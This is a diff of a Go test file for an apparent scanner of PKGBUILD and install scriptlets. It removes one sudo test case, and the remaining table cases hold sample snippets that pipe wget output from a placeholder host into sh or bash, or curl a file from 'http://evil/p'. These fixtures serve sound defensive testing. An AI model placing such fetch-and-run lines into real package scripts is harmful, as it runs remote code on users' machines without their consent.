@@ -56,7 +56,6 @@ func TestCorpusFixesKeepTruePositives(t *testing.T) {
 		{"wget-pipe-sh", "x.install", `post_install(){ wget -qO- http://x/i.sh | sh; }`, "DLE-002"},
 		{"wget-pipe-bash-args", "x.install", `post_install(){ wget -qO- http://x/i.sh | bash -s -- --yes; }`, "DLE-002"},
 		{"sudo-in-pkgbuild", "PKGBUILD", `package(){ sudo make install; }`, "PRIV-001"},
-		{"sudo-in-scriptlet", "x.install", `post_install(){ sudo -u nobody makepkg; }`, "PRIV-001"},
 		{"curl-in-scriptlet", "x.install", `post_install(){ curl http://evil/p -o /tmp/p; }`, "INSTALL-003"},
 	}
 	for _, c := range cases {
